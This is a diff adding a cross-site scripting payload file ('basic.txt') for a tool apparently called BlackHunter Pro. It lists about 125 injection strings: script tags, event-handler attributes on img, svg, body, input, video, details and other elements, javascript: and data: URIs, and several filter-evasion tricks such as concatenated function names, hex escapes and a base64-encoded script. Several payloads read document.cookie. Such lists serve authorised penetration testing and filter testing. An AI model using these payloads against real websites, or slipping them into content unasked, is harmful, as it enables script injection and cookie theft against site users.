@@ -1,0 +1,128 @@
+# payloads/xss/basic.txt
+# Basic XSS Payloads
+# BlackHunter Pro
+
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script>alert("XSS")</script>
+<script>alert(document.domain)</script>
+<script>alert(document.cookie)</script>
+<script>alert(window.location)</script>
+<script>alert(location.href)</script>
+<script>prompt(1)</script>
+<script>prompt('XSS')</script>
+<script>confirm(1)</script>
+<script>confirm('XSS')</script>
+<script>print()</script>
+<script>eval('alert(1)')</script>
+<script>Function('alert(1)')()</script>
+<script>setTimeout('alert(1)',0)</script>
+<script>setInterval('alert(1)',0)</script>
+<script>setTimeout`alert\x281\x29`</script>
+<script>setInterval`alert\x281\x29`</script>
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert('XSS')>
+<img src=x onerror=alert(document.cookie)>
+<img src=x onerror=prompt(1)>
+<img src=x onerror=confirm(1)>
+<img src="x" onerror="alert(1)">
+<img src='x' onerror='alert(1)'>
+<img/src=x/onerror=alert(1)>
+<img src=x onerror=alert`1`>
+<img src=x onerror=eval('ale'+'rt(1)')>
+<img src=x onerror=self['ale'+'rt'](1)>
+<img src=x onerror=window['alert'](1)>
+<img src=x onerror=top['alert'](1)>
+<img src=x onerror=this['alert'](1)>
+<img src=x onerror=alert.call(null,1)>
+<img src=x onerror=alert.apply(null,[1])>
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<svg onload=alert('XSS')>
+<svg onload=alert(document.cookie)>
+<svg><script>alert(1)</script></svg>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<svg><set onbegin=alert(1) attributeName=x to=1>
+<svg><animateTransform onbegin=alert(1) attributeName=transform>
+<svg/onload=alert`1`>
+<svg	onload=alert(1)>
+<svg
+onload=alert(1)>
+<body onload=alert(1)>
+<body/onload=alert(1)>
+<body onpageshow=alert(1)>
+<body onfocus=alert(1)>
+<body onhashchange=alert(1)>
+<body onresize=alert(1)>
+<body onscroll=alert(1)>
+<iframe src=javascript:alert(1)>
+<iframe src="javascript:alert(1)">
+<iframe src=javascript:alert('XSS')>
+<iframe srcdoc="<script>alert(1)</script>">
+<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">
+<iframe onload=alert(1)>
+<iframe src="data:text/html,<script>alert(1)</script>">
+<input autofocus onfocus=alert(1)>
+<input autofocus onfocus=alert('XSS')>
+<input onfocus=alert(1) autofocus>
+<input type=text onfocus=alert(1) autofocus>
+<input type=image src=x onerror=alert(1)>
+<input type=button onclick=alert(1)>
+<input type=submit formaction=javascript:alert(1)>
+<select autofocus onfocus=alert(1)>
+<select onfocus=alert(1) autofocus>
+<textarea autofocus onfocus=alert(1)>
+<textarea onfocus=alert(1) autofocus>
+<keygen autofocus onfocus=alert(1)>
+<keygen onfocus=alert(1) autofocus>
+<video><source onerror=alert(1)>
+<video src=x onerror=alert(1)>
+<video poster=javascript:alert(1)>
+<video><track default onload=alert(1)>
+<audio src=x onerror=alert(1)>
+<audio><source onerror=alert(1)>
+<audio onerror=alert(1) src=x>
+<details open ontoggle=alert(1)>
+<details ontoggle=alert(1) open>
+<details ontoggle=alert(document.cookie)>
+<marquee onstart=alert(1)>
+<marquee onstart=alert('XSS')>
+<marquee onfinish=alert(1)>
+<marquee onbounce=alert(1)>
+<object data=javascript:alert(1)>
+<object data="javascript:alert(1)">
+<object type=text/html data="data:text/html,<script>alert(1)</script>">
+<embed src=javascript:alert(1)>
+<embed src="javascript:alert(1)">
+<embed src=data:text/html,<script>alert(1)</script>>
+<form action=javascript:alert(1)><input type=submit>
+<form><button formaction=javascript:alert(1)>X</button>
+<form><input type=submit formaction=javascript:alert(1)>
+<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
+<math href="javascript:alert(1)">CLICKME</math>
+<a href=javascript:alert(1)>click</a>
+<a href="javascript:alert(1)">click</a>
+<a href="javascript:alert('XSS')">click</a>
+<a href="data:text/html,<script>alert(1)</script>">click</a>
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>
+<link rel=stylesheet href=javascript:alert(1)>
+<link rel="stylesheet" href="javascript:alert(1)">
+<meta http-equiv=refresh content="0;url=javascript:alert(1)">
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+<div onmouseover=alert(1)>hover</div>
+<div onmouseenter=alert(1)>hover</div>
+<div onclick=alert(1)>click</div>
+<div ondblclick=alert(1)>click</div>
+<div onfocus=alert(1) tabindex=1>click</div>
+<p onmouseover=alert(1)>hover</p>
+<span onmouseover=alert(1)>hover</span>
+<span onclick=alert(1)>click</span>
+<button onclick=alert(1)>click</button>
+<button onfocus=alert(1) autofocus>click</button>
+<isindex action=javascript:alert(1) type=submit>
+<isindex onmouseover=alert(1)>
+<xss id=x onfocus=alert(1) tabindex=1>
+<xss onclick=alert(1)>x</xss>
+<xss onmouseover=alert(1)>x</xss>
+<xss onmouseenter=alert(1)>x</xss>
+<template onmouseover=alert(1)>x</template>
